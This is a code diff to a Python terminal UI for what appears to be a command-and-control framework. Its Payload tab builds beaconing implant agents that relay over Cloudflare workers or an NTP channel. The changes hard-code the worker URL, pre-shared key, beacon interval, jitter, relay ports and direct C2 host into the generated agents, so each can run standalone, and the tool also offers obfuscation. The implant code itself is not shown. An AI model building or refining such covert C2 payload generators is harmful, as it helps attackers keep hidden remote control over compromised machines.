@@ -7,6 +7,9 @@ Two-tab interactive TUI:
             Agents auto-appear as soon as they beacon; no manual registration.
   Payload — bake cloudflare/agent.py or ntp/agent.py with custom settings
             (type, interval, jitter, PSK, worker URL) and optionally obfuscate.
+            All agent config (WORKER_URL, C2_PSK, C2_INT, C2_JITTER, relay/
+            TCP port, C2_DIRECT) is baked as plain literals: the generated
+            file runs standalone with `python3 <name>.py`, no env vars needed.
 
 Usage:
     python tui.py
@@ -62,17 +65,17 @@ def _ago(epoch: int) -> str:
 def _patch_agent(src: str, psk: str, interval: int, jitter: int) -> str:
     src = re.sub(
         r'BEACON_INT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
-        f'BEACON_INT = int(os.environ.get("C2_INT", "{interval}"))',
+        f'BEACON_INT = {interval}',
         src,
     )
     src = re.sub(
         r'JITTER\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
-        f'JITTER     = int(os.environ.get("C2_JITTER", "{jitter}"))',
+        f'JITTER     = {jitter}',
         src,
     )
     src = re.sub(
         r'C2_PSK\s*=\s*os\.environ\.get\([^)]+\)',
-        f'C2_PSK     = os.environ.get("C2_PSK", "{psk}")',
+        f'C2_PSK     = {psk!r}',
         src,
     )
     return src
@@ -84,30 +87,41 @@ def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
     src = (HERE / "cloudflare-worker" / "nullrelay.py").read_text(encoding="utf-8")
     src = re.sub(
         r'WORKER_URL\s*=\s*os\.environ\.get\([^)]+\)',
-        f'WORKER_URL = os.environ.get("WORKER_URL", "{worker_url}")',
+        f'WORKER_URL = {worker_url!r}',
         src,
     )
     src = re.sub(
         r'PSK\s*=\s*os\.environ\.get\([^)]+\)',
-        f'PSK        = os.environ.get("C2_PSK", "{psk}")',
+        f'PSK        = {psk!r}',
         src,
     )
     src = re.sub(
         r'BEACON_INT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
-        f'BEACON_INT = int(os.environ.get("C2_INT", "{interval}"))',
+        f'BEACON_INT = {interval}',
         src,
     )
     src = re.sub(
         r'JITTER\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
-        f'JITTER     = int(os.environ.get("C2_JITTER", "{jitter}"))',
+        f'JITTER     = {jitter}',
         src,
     )
     if relay_port:
         src = re.sub(
-            r'RELAY_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
-            f'RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "{relay_port}"))',
+            r'\bRELAY_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
+            f'RELAY_PORT  = {relay_port}',
             src,
         )
+    else:
+        src = re.sub(
+            r'\bRELAY_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
+            'RELAY_PORT  = 0',
+            src,
+        )
+    src = re.sub(
+        r'\bRELAY_BIND\s*=\s*os\.environ\.get\([^)]+\)',
+        "RELAY_BIND  = '0.0.0.0'",
+        src,
+    )
     out = HERE / out_name
     out.write_text(src, encoding="utf-8")
     return out
@@ -115,19 +129,49 @@ def _bake_agent_cloudflare(worker_url: str, psk: str, interval: int,
 
 def _bake_agent_ntp(psk: str, interval: int, jitter: int,
                     out_name: str, tcp_port: int = 443,
-                    relay_host: str = "") -> pathlib.Path:
+                    relay_host: str = "", worker_url: str = "") -> pathlib.Path:
     ntp_agent = HERE / "ntp" / "clockvenom.py"
     if not ntp_agent.exists():
         raise FileNotFoundError(f"ntp agent not found: {ntp_agent}")
     src = _patch_agent(ntp_agent.read_text(encoding="utf-8"), psk, interval, jitter)
     src = re.sub(
         r'TCP_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
-        f'TCP_PORT         = int(os.environ.get("C2_TCP_PORT", "{tcp_port}"))',
+        f'TCP_PORT         = {tcp_port}',
         src,
     )
     src = re.sub(
         r'C2_DIRECT\s*=\s*os\.environ\.get\([^)]+\)',
-        f'C2_DIRECT        = os.environ.get("C2_DIRECT", "{relay_host}")',
+        f'C2_DIRECT        = {relay_host!r}',
+        src,
+    )
+    url = worker_url
+    if not url:
+        m = re.search(r'WORKER_URL\s*=\s*os\.environ\.get\("WORKER_URL",\s*"([^"]*)"\)', src)
+        url = m.group(1) if m else ""
+    if url:
+        src = re.sub(
+            r'WORKER_URL\s*=\s*os\.environ\.get\([^)]+\)',
+            f'WORKER_URL       = {url!r}',
+            src,
+        )
+    src = re.sub(
+        r'\bRELAY_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
+        'RELAY_PORT       = 0',
+        src,
+    )
+    src = re.sub(
+        r'\bRELAY_BIND\s*=\s*os\.environ\.get\([^)]+\)',
+        "RELAY_BIND       = '0.0.0.0'",
+        src,
+    )
+    src = re.sub(
+        r'NTP_RELAY_PORT\s*=\s*int\(os\.environ\.get\([^)]+\)\)',
+        'NTP_RELAY_PORT   = 0',
+        src,
+    )
+    src = re.sub(
+        r'NTP_RELAY_TARGET\s*=\s*os\.environ\.get\([^)]+\)',
+        "NTP_RELAY_TARGET = ''",
         src,
     )
     out = HERE / out_name
@@ -2355,7 +2399,8 @@ class CipherfallTUI(App):
                 tcp_port = relay_port if relay_mode else 443
                 host     = relay_host if relay_mode else ""
                 out = await asyncio.to_thread(
-                    _bake_agent_ntp, psk, interval, jitter, out_name, tcp_port, host
+                    _bake_agent_ntp, psk, interval, jitter, out_name, tcp_port,
+                    host, worker_url,
                 )
             else:
                 out = await asyncio.to_thread(
